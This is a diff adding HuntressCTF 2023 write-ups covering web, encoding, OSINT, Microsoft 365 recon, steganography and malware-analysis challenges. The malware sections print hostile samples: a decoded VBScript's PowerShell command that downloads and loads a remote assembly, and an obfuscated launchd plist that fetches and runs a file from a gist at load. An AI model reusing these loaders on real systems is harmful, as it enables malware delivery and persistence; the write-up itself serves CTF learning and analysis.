@@ -1,4 +1,4 @@
-Here are my solutions for the challenges I solved as a part of HuntressCTF 2023. 
+Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 
 - [[Warmups] F12 (Easy)](#f12)
 - [[Warmups] String Cheese (Easy)](#string-cheese)
@@ -17,6 +17,19 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Malware] HumanTwo (Easy)](#humantwo)
 - [[Malware] BlackCat (Easy)](#blackcat)
 - [[Malware] PHP Stager (Easy)](#php-stager)
+- [[Malware] VeeBeeEee (Easy)](#veebeeeee)
+- [[Malware] OpenDir (Easy)](#opendir)
+- [[Malware] Operation Eradication (Easy)](#operation-eradication)
+- [[OSINT] Under The Bridge (Medium)](#under-the-bridge)
+- [[OSINT] Operation Not Found (Medium)](#operation-not-found)
+- [[OSINT] Where am I? (Medium)](#where-am-i)
+- [[M365] General Info (Easy)](#m365-general-info)
+- [[M365] Conditional Access (Easy)](#m365-conditional-access)
+- [[M365] Teams (Easy)](#m365-teams)
+- [[M365] The President (Easy)](#m365-the-president)
+- [[Misc] PRESS PLAY ON TAPE (Easy)](#press-play-on-tape)
+- [[Misc] Welcome to the Park (Easy)](#welcome-to-the-park)
+- [[Stego] Land Before Time (Easy)](#land-before-time)
 
 ## F12
 During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:
@@ -162,6 +175,52 @@ This gives us the final flag (you need to read the paragraphs as they give you e
 
 ```
 flag{julius_in_a_reflection}
+```
+
+## Book By Its Cover
+This is just a file with the wrong extension. The file header indicates it is a PNG, and opening it as a PNG revealed the flag:
+
+```
+flag{f8d32a346745a6c4bf4e9504ba5308f0}
+```
+
+## BaseFFFF+1
+This challenge, as the title suggests, was in [base65536](https://github.com/qntm/base65536). I decoded it with an online decoder to get the flag:
+
+```
+flag{716abce880f09b7cdc7938eddf273648}
+```
+
+## Baking
+This was a live web instance challenge. It was basically an oven with buttons on some things you could cook such as brownies and muffins. Each item had a specific amount of time it would take which would trigger a counter, but the "Magic Cookies" which I assumed contained the flag were set to 7200 minutes.
+
+Taking the hint, I looked at the cookies for the website:
+
+```
+in_oven eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzI3LzIwMjMsIDAxOjU1OjA3In0=
+```
+
+This decoded to:
+
+```
+{"recipe": "Magic Cookies", "time": "10/27/2023, 01:55:07"}
+```
+
+I simply changed it to be way ahead of done, re-encoded it, and overwrote my cookie, and when I refreshed the page my flag was printed!
+
+## Dialtone
+This was a challenge that had to do with DTMF tones that phones use. I found an online tool to extract the digits from DTMF recordings online and got this number:
+
+```
+13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
+```
+
+Then I converted this large number back to bytes using a Python interpreter:
+
+```
+>>> bigint = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
+>>> bytearray.fromhex('{:0192x}'.format(bigint))
+bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag{6c733ef09bc4f2a4313ff63087e25d67}')
 ```
 
 ## Opposable Thumbs
@@ -690,4 +749,244 @@ F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT
 end
 $ cat uuencode.uu 
 flag{9b5c4313d12958354be6284fcd63dd26}
+```
+
+## VeeBeeEee
+This file presented an encoded VB script (extension is supposed to be `.vbe`). There are decoders online, and it decodes to an obfuscated script. I saw some references to PowerShell and such but I decided just to have it print out what it runs at the bottom of the script:
+
+```
+WScript.Echo Code <-- I added this in to see what Code was
+Return = Object.Run(Code, 0, true)
+```
+
+The code that this statement executes is:
+```
+>cscript decoded.vbs
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PowerShell $f='C:\Users\Public\Documents\July.htm';if (!(Test-Path $f)){Invoke-WebRequest 'https://pastebin.com/raw/SiYGwwcz' -outfile $f  };[System.Reflection.Assembly]::loadfile($f);[WorkArea.Work]::Exe()
+```
+
+What's in this pastebin?
+
+```
+$ curl -i https://pastebin.com/raw/SiYGwwcz
+HTTP/2 200 
+date: Fri, 27 Oct 2023 04:12:25 GMT
+content-type: text/plain; charset=utf-8
+x-frame-options: DENY
+x-content-type-options: nosniff
+x-xss-protection: 1;mode=block
+cache-control: public, max-age=1801
+cf-cache-status: MISS
+last-modified: Fri, 27 Oct 2023 04:12:25 GMT
+server: cloudflare
+cf-ray: 81c819c19a5d3aac-DFW
+
+<!-- flag{ed81d24958127a2adccfb343012cebff} -->
+```
+
+## OpenDir
+This challenge opens an instance that serves a web index with a bunch of malicious files, so I pulled them all down:
+
+```
+$ wget --user opendir --password=opendir http://chal.ctf.games:32136/ -r --no-parent
+Downloaded: 196 files, 18M in 5.0s (3.59 MB/s)
+```
+
+Then I grepped for the flag because there's no way I'm going through all of these manually:
+
+```
+$ grep -r ".*flag.*" .
+grep: ./sir/LPE/InstallerFileTakeOver.exe: binary file matches
+./sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
+```
+
+## Operation Eradication
+This challenge launches a web instance and also has a file containing this:
+
+```
+type = webdav
+url = http://localhost/webdav
+vendor = other
+user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-
+```
+
+
+```
+> rclone.exe ls dab:
+  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
+  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
+   685745 ProductDevelopment/Reviews/NewProductReviewSummary.pdf
+  2598294 ProductDevelopment/Reviews/UpdatedProductReviewSummary.pdf
+  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
+```
+
+I tried to delete all the files but was getting permission errors. After some thinking I decided to pull the files, delete their contents, and then re-upload them, effectively overwriting them. I wrote a simple PowerShell script to do this automatically:
+
+```
+$directoryPath = "C:\Temp"
+$fileList = Get-ChildItem -Path $directoryPath -Recurse -File
+
+# Loop through each file and clear its content
+foreach ($file in $fileList) {
+    Clear-Content -Path $file.FullName
+    Write-Host "Content cleared for file: $($file.FullName)"
+}
+```
+
+Then ran the copy command using `rclone`:
+
+```
+> rclone -v copy c:\temp dab:    
+```
+
+When I revisited the challenge instance website, it presented the flag:
+
+```
+flag{564607375b731174f2c08c5bf16e82b4}
+```
+
+## Under The Bridge
+This was a geoguesser-style challenge. The way I solve these is looking for individual clues, such as:
+
+- European license plates. Note the yellow ones, which are more common in northern Europe.
+- English text on signage
+- Shurgard sign (Storage unit company)
+- Near a bridge
+- White construction cranes very close by
+
+I went to the Shurgard website and started looking at their locations. The first one I clicked on at random was the right one! It is the Shurgard in Kensington. 
+
+## Operation Not Found
+Same as [Under The Bridge](#under-the-bridge), I collected some clues:
+
+- Sign for Brasfield and Gorrie contractors, a US company
+- Photo dated 2019
+- Many people with backpacks, all look young like students 
+
+Their website had a listing of projects that they have been contracted to oversee, and I filtered for Education projects and found the exact building: [Georgia Institute of Technology Price Gilbert Library](https://www.brasfieldgorrie.com/expertise/project/georgia-institute-of-technology-price-gilbert-library-and-crosland-tower-renewal/)
+
+## Where am I
+This was a simple EXIF challenge:
+
+```
+$ exiftool PXL_20230922_231845140_2.jpg  | grep Description
+Image Description               : ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=
+$ echo -n 'ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=' | base64 -d
+flag{b11a3f0ef4bc170ba9409c077355bba2)
+```
+
+## M365 General Info
+This challenged asked for the Tenant's street address, which you can find with this command:
+
+```
+PS /home/user> Get-AADIntTenantDetails | Select -Property street
+
+street
+------
+flag{dd7bf230fde8d4836917806aff6a6b27}
+```
+
+## M365 Conditional Access
+This challenge asked to find strange conditional access policies. There was only one custom policy:
+
+```
+> Get-AADIntConditionalAccessPolicies | Select -Property displayName
+
+displayName
+-----------
+flag{d02fd5f79caa273ea535a526562fd5f7}
+```
+
+## M365 Teams
+This one stated we needed to find some sensitive data shared over a Teams message. Teams is Microsoft's extremely slow version of Slack.
+
+```
+> Get-AADIntTeamsMessages  | Select -Property Content
+
+Content
+-------
+flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}
+```
+
+## M365 The President
+This one hints that an account has the flag in its account details.
+
+```
+> Get-AADIntUsers | Where-Object {$_.Title -eq "President"} | Select -Property PhoneNumber
+
+PhoneNumber
+-----------
+flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
+```
+
+## PRESS PLAY ON TAPE
+This is a reference to the tape loading of the Commodore 64. I used a utility to solve this:
+
+```
+wav2tap.exe pressplayontape.wav | c64tapedecode.exe -v
+```
+
+Inside was a basic file containing the flag:
+
+```
+C64File
+"FLAG[32564872D760263D52929CE58CC40071]"  
+```
+
+## Welcome to the Park
+This was a MacOS app directory. There was a hidden Mach-O file inside, which contained the following XML (it was Base64 encoded):
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+	<dict>
+		<key>Label</key>
+		<string>com.huntress.ctf</string>
+		<key>ProgramArguments</key>
+		<array>
+			<string>/bin/zsh</string>
+			<string>-c</string>
+			<string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
+		</array>
+		<key>RunAtLoad</key>
+		<true />
+		<key>StartInterval</key>
+		<integer>14400</integer>
+	</dict>
+</plist>
+```
+
+It seemed to contain a GitHub Gists URL which I reconstructed manually:
+
+```
+https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01
+```
+
+This contained a JPEG image of a person. At the very end of the file was the flag:
+
+```
+flag{680b736565c76941a364775f06383466}
+```
+
+## Land Before Time
+This challenge was a PNG file that was likely used to hide something else with a password. The prompt was:
+
+```
+This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb. 
+```
+
+I learned of a cool tool doing this one: [stego-toolkit](https://github.com/DominicBreuker/stego-toolkit). I didn't want to install anything new on my system so I just ran this docker command and worked from there and deleted the image when I was done!
+
+Unfortunately the tools in here didn't work so I had to download the iSteg Java Application and run it. There was no password:
+
+```
+>> Steg file selected: "C:\Users\REM\Desktop\dinosaurs1.png"
+>> Oparation completed successfully.
+>> Here is the message:
+flag{da1e2bf9951c9eb1c33b1d2008064fee}
 ```
